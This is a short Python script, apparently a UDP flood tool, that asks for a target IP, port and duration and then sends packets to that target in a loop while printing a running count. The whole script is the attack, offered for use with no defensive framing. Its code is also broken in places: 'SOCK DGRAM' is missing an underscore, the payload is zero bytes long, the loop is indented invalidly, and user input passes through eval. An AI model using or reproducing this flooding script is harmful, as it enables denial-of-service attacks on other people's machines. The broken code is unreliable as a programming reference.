# Imports
from __future__ import absolute_import
from __future__ import print_function
import os
import sys
import socket
import random
import time
from six.moves import input

# Variables
sock = socket.socket (socket.AF_INET,
socket.SOCK DGRAM) #Open a new socket

bytes = random._urandom(0) # Packet length to be sent to the target machine

os.system("clear")
ip = input("Target IP: ")
port = eval(input("Port: "))
duration = eval(input("Number of seconds to send packets: "))

timeout = time.time() + duration
sent = 0

# Functions
while True:
    try:
        if time.time() > timeout:
            break
        else:
            pass
                sock.sendto(bytes,(ip, port))
                sent = sent + 1
                print("Sent %s packet to %s throught port %s"%(sent, ip, port))
            except KeyboardInterrupt:
                sys.exit()
